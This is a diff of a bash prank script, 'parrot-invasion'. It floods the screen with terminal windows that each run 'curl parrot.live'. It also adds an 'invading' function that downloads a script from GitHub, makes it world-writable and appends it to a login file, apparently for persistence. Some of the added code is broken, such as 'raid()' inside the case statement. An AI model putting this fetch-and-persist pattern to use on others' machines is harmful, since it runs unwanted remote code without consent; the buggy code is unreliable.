@@ -1,26 +1,37 @@
 #!/bin/bash
 
-parrot_raid()
+raid()
 {
-	nb_colonne=3
-	nb_ligne=4
+# Format gnome : gnome-terminal --window --geometry=[width]x[length]+[cordX]+[cordY]
+# Obtenir la résolution de l'écran : resolution=$(xdpyinfo | awk '/dimensions:/ {print $2}')
 
-	width_terminal=80
-	heigth_terminal=24
+nb_colonne=3
+nb_ligne=4
 
-	width_pixel=12
-	heigth_pixel=22
+width_terminal=80
+heigth_terminal=24
 
-	for i in $(seq 0 $((nb_colonne - 1)))
-	do
-	for j in $(seq 0 $((nb_ligne - 1)))
-	do
-		((X = j * 1050))
-		((Y = i * 750))
+width_pixel=12
+heigth_pixel=22
 
-		gnome-terminal --window --geometry=${width_terminal}x${heigth_terminal}+${X}+${Y} -- bash -c "curl parrot.live; exec bash"  &
-	done
-	done
+for i in $(seq 0 $((nb_colonne - 1)))
+do
+  for j in $(seq 0 $((nb_ligne - 1)))
+  do
+    ((X = j * 1050))
+    ((Y = i * 750))
+
+    gnome-terminal --window --geometry=${width_terminal}x${heigth_terminal}+${X}+${Y} -- bash -c "curl parrot.live; exec bash" &
+  done
+done
+}
+
+invading()
+{
+	curl -O https://raw.githubusercontent.com/Chahalor/parrot-invasion/refs/heads/...
+	chmod 777 invading.sh
+	echo $(realpath ./invading.sh) >> ~login.sh
+	echo $(realpath)
 }
 
 	clear
@@ -29,23 +40,27 @@ parrot_raid()
 	echo "| 1 - sending a raid      |"
 	echo "| 2 - make an invasion    |"
 	echo "| 3 - take over this place|"
-	echo "|                         |"
+	echo "| 4 - cleaning the shit   |"
 	echo "| q - quit                |"
 	echo "|_________________________|"
 	echo
 
 while true; do
 
-	read -p "parrot.live >>> " choix
+	read -p "Choisissez une option : " choix
 	case $choix in
 		1)
-			parrot_raid
+  			raid()
 			;;
 		2)
-			echo "not implement"
+			chmod -x ./crontab.sh
+			timeout 5 bash crontab.sh
 			;;
 		3)
 			echo "not implement"
+			;;
+		4)
+			rm parrot_invasion.sh
 			;;
 		q)
 			echo "Quit"
